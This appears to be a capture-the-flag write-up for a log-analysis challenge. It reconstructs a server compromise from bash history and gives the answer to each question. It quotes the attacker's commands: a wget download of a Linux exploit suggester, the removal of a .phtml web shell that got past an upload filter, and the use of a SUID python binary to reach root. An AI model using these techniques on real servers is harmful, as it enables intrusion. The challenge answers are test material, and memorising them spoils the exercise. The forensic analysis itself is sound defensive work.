# Log Analysis - Privilege Escalation

A server with sensitive data was accessed by an attacker and the files were posted on an underground forum. This data was only available to a privileged user, in this case the ‘root’ account.  <br>

Responders say ‘www-data’ would be the logged in user if the server was remotely accessed, and this user doesn’t have access to the data. The developer stated that the server is hosting a PHP-based website and that proper filtering is in place to prevent php file uploads to gain malicious code execution.  <br>

The bash history is provided to you but the recorded commands don’t appear to be related to the attack. Can you find what actually happened? 

# Questions

## What user (other than ‘root’) is present on the server? 
 
We can see that the attacker changed to a user folder

```bash
cd /home/daniel/
```

**Answer:** daniel

## What script did the attacker try to download to the server?

He used **wget** to download a kernel exploit suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

**Answer:** linux-exploit-suggester.sh

## What packet analyzer tool did the attacker try to use? 

Not much to say

**Answer:** tcpdump

##  What file extension did the attacker use to bypass the file upload filter implemented by the developer? 

Last command in the **bash_history**

```bash
rm /var/www/html/uploads/x.phtml
```
**Answer:** phtml

##  Based on the commands run by the attacker before removing the php shell, what misconfiguration was exploited in the ‘python’ binary to gain root-level access? 1- Reverse Shell ; 2- File Upload ; 3- File Write ; 4- SUID ; 5- Library load 

Well, since the attacker just did an inline command to spawn a shell, the answer is pretty straight forward

**Answer:** 4 